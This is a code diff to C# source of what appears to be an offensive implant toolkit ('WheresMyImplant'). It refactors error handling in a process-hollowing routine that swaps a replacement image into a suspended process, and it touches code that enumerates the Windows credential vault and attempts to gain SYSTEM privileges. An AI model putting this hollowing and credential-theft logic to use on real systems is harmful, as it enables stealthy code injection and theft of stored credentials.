@@ -327,50 +327,42 @@ namespace WheresMyImplant
             HollowProcess hp = new HollowProcess();
             if (!hp.CreateSuspendedProcess(target))//@"C:\Windows\notepad.exe"))
             {
-                Console.WriteLine(new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error()).Message);
-                return String.Empty;
+                return Misc.GetError();
             }
 
             if (!hp.ReadPEB())
             {
-                Console.WriteLine(new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error()).Message);
-                return String.Empty;
+                return Misc.GetError();
             }
 
             if (!hp.GetTargetArch())
             {
-                Console.WriteLine(new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error()).Message);
-                return String.Empty;
+                return Misc.GetError();
             }
 
             if (!hp.GetContext())
             {
-                Console.WriteLine(new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error()).Message);
-                return String.Empty;
+                return Misc.GetError();
             }
 
             if (!hp.ReadNTHeaders())
             {
-                Console.WriteLine(new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error()).Message);
-                return String.Empty;
+                return Misc.GetError();
             }
 
             if (!hp.ReadSourceImage(replacement))
             {
-                Console.WriteLine(new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error()).Message);
-                return String.Empty;
+                return Misc.GetError();
             }
 
             if (!hp.RemapImage())
             {
-                Console.WriteLine(new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error()).Message);
-                return String.Empty;
+                return Misc.GetError();
             }
 
             if (!hp.ResumeProcess64())
             {
-                Console.WriteLine(new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error()).Message);
-                return String.Empty;
+                return Misc.GetError();
             }
 
             return "Process Hollowed";
@@ -511,7 +503,6 @@ namespace WheresMyImplant
             vault.EnumerateCredentials();
 
             CheckPrivileges checkSystem = new CheckPrivileges();
-            String results = "";
             if (checkSystem.GetSystem())
             {
                 vault = new Vault();
